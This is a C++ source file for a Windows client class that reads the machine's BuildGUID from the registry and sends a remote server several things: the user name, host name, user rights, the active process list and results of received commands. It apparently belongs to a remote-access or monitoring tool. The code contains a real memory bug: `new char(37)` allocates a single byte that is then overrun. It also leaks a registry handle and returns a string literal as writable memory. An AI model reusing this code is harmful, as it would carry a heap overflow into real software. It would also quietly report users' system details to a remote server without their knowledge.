#include "Handling.h"

Handling::Handling(std::string const & addrIP, std::string const & port)
	: sJson(), sSocket(addrIP, port)
{
	memcpy(_header.idClient, getGUID(), 32);
	_header.idClient[32] = 0;
	memcpy(_header.magicKey, MAGIC_KEY, 8);
	_header.magicKey[8] = 0;
}


Handling::~Handling()
{
}

char *Handling::getGUID()
{
	HKEY		hKey = NULL;
	DWORD		regType = REG_SZ;
	char		tmpGuid[37] = { 0 };
	char*		guid = new char(37);
	DWORD		len = sizeof(tmpGuid);

	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == 0)
	{
		if (RegGetValue(hKey, NULL, "BuildGUID", RRF_RT_ANY, &regType, (PVOID)tmpGuid, &len) == ERROR_SUCCESS)
		{
			tmpGuid[35] = '\0';
			strcpy_s(guid, sizeof(tmpGuid), &tmpGuid[0]);
			return guid;
		}
	}

	if (hKey != NULL)
		RegCloseKey(hKey);
	return "00000000-0000-0000-0000-00000000";
}

void		Handling::doData(std::string const & buffer, unsigned int & cpt)
{
	std::string	bufStock;
	unsigned int sizeCpy = buffer.size() - cpt > (DATA_BUFSIZE - HEADER_SIZE) ? (DATA_BUFSIZE - HEADER_SIZE) : (unsigned int)(buffer.size() - cpt);
	bufStock.append(buffer, cpt, sizeCpy);
	cpt += sizeCpy;
	_header.dataSize = sizeCpy;
	sSend(&_header, sizeof(s_HeaderDataForPacket));
	sSend(bufStock);
}

void	Handling::doPackets(std::string const & buffer)
{
	double calc = ((double)(buffer.size()) / (double)(DATA_BUFSIZE - HEADER_SIZE));
	unsigned int	nbCut = (unsigned int)(calc > (int)calc ? calc + 1 : calc);
	unsigned int	cpt = 0;

	for (unsigned int i = 0; i < nbCut; ++i)
	{
		_header.globalSize = (unsigned int)buffer.size();
		_header.nbPacket = nbCut;
		_header.numPacket = i;
		doData(buffer, cpt);
	}
}

void	Handling::sendPackets()
{
	doPackets(getBufferActiveProcessFull());
}

void	Handling::sendStartUp(std::string const & userName, std::string const & hostName, std::string const & userRights)
{
	std::string buffer = putStartUp(userName, hostName, userRights);
	_header.globalSize = (unsigned short)buffer.size();
	_header.dataSize = (unsigned short)buffer.size();
	_header.nbPacket = 1;
	_header.numPacket = 1;
	sSend(&_header, sizeof(s_HeaderDataForPacket));
	sSend(buffer);
}

void	Handling::sendAnswerCommand(std::string const & cmd, std::string const & ret, std::string const & time)
{
	std::string buffer = putAnswerCommand(cmd, ret, time);
	_header.globalSize = (unsigned short)buffer.size();
	_header.dataSize = (unsigned short)buffer.size();
	_header.nbPacket = 1;
	_header.numPacket = 1;
	sSend(&_header, sizeof(s_HeaderDataForPacket));
	sSend(buffer);
}
